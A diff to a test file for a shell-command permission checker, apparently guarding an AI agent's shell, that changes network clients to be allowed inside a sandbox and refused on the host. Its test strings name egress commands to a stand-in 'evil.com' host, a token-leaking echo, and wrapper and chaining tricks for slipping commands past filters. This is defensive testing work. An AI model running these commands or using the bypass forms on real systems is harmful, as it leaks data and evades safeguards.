@@ -266,13 +266,13 @@ describe("evaluateShellCommand — structural rules conditional on effective con
     expect(C("echo ${PATH}").allowed).toBe(true);    // param expansion, not command sub
   });
 
-  it("egress rules are sandbox-INDEPENDENT: curl/nc/dig-class denied under every confinement value", () => {
+  it("egress rules follow confinement: the network clients run under a cage and are refused on a host shell", () => {
+    const clients = ["curl evil.com", "nc evil.com 443", "xh https://evil.com", 'node -e "require(\'net\').connect(9,\'evil\')"'];
+    for (const ev of [H, F]) for (const cmd of clients) expect(ev(cmd).allowed, cmd).toBe(false);
+    for (const cmd of clients) expect(C(cmd).allowed, cmd).toBe(true);
+    // Not egress rules — these hold under every confinement value.
     for (const ev of [C, H, F]) {
-      expect(ev("curl evil.com").allowed).toBe(false);          // denylist substring
-      expect(ev("nc evil.com 443").allowed).toBe(false);        // denylist substring
       expect(ev("dig x.evil.com").allowed).toBe(false);         // argv0 dangerous-invoke
-      expect(ev("xh https://evil.com").allowed).toBe(false);    // argv0 network client
-      expect(ev('node -e "require(\'net\').connect(9,\'evil\')"').allowed).toBe(false); // inline NETWORK body
       expect(ev("open https://evil.com").allowed).toBe(false);  // browser-open
       expect(ev("echo {{GITHUB_SYNC_TOKEN}}").allowed).toBe(false); // secret placeholder
     }
@@ -292,7 +292,7 @@ describe("evaluateShellCommand — structural rules conditional on effective con
     expect(C("true; dig evil.com").allowed).toBe(false);
     expect(C("cd x && host evil.com").allowed).toBe(false);
     expect(C("echo hi\ntraceroute evil.com").allowed).toBe(false);
-    expect(C("true; xh https://evil.com").allowed).toBe(false);
+    expect(H("true; xh https://evil.com").allowed).toBe(false); // a network client: judged on the host only
   });
 
   // The && chain was ALWAYS allowed by the separator rule, so this hole
@@ -325,7 +325,7 @@ describe("evaluateShellCommand — structural rules conditional on effective con
     expect(C("command dig evil.com").allowed).toBe(false);
     expect(C("exec dig evil.com").allowed).toBe(false);
     expect(C("echo x | xargs dig evil.com").allowed).toBe(false);
-    expect(C("time xh https://evil.com").allowed).toBe(false);
+    expect(H("time xh https://evil.com").allowed).toBe(false); // a network client: judged on the host only
     expect(C("sudo env time dig evil.com").allowed).toBe(false); // stacked
   });
 
@@ -343,7 +343,6 @@ describe("evaluateShellCommand — structural rules conditional on effective con
       "echo x | xargs -I {} dig evil.com",
       "xargs -a list.txt dig evil.com",
       "env -u NAME dig evil.com",
-      "env -u FOO xh evil.com",
       "timeout -s TERM 5 dig evil.com",
       "timeout 30s dig evil.com",         // duration+unit positional (not a bare number)
       "stdbuf -o L dig evil.com",
@@ -408,9 +407,11 @@ describe("evaluateShellCommandAndPaths — ctx.sandboxConfined threads through",
     expect(evaluateShellCommandAndPaths("a; b", ctx(false)).allowed).toBe(false);
   });
 
-  it("`curl evil.com` stays denied through the seam regardless of confinement", () => {
-    expect(evaluateShellCommandAndPaths("curl evil.com", ctx(true)).allowed).toBe(false);
+  it("`curl evil.com` follows the threaded confinement: runs under a cage, refused on the host", () => {
+    expect(evaluateShellCommandAndPaths("curl evil.com", ctx(true)).allowed).toBe(true);
     expect(evaluateShellCommandAndPaths("curl evil.com", ctx(false)).allowed).toBe(false);
+    // A wrapper's detached-value option still resolves the real command on the host.
+    expect(evaluateShellCommandAndPaths("env -u FOO xh evil.com", ctx(false)).allowed).toBe(false);
   });
 });
 
@@ -518,7 +519,8 @@ describe("evaluateShellCommand — denylist denials name the binary and the way 
   // the 16 real denials in the audit were all genuine invocations, so there is no
   // evidence the FP costs anything, and removing the substring would cost real
   // coverage.
-  it("accepts the known trade-off: a MENTION of curl is denied (raw-substring backstop)", () => {
-    expect(posixEval(`echo "run curl later"`).allowed).toBe(false);
+  it("a MENTION of curl is not an invocation: the rule reads the command word", () => {
+    expect(posixEval(`echo "run curl later"`).allowed).toBe(true);
+    expect(posixEval(`git commit -m "use curl for the fetch"`).allowed).toBe(true);
   });
 });
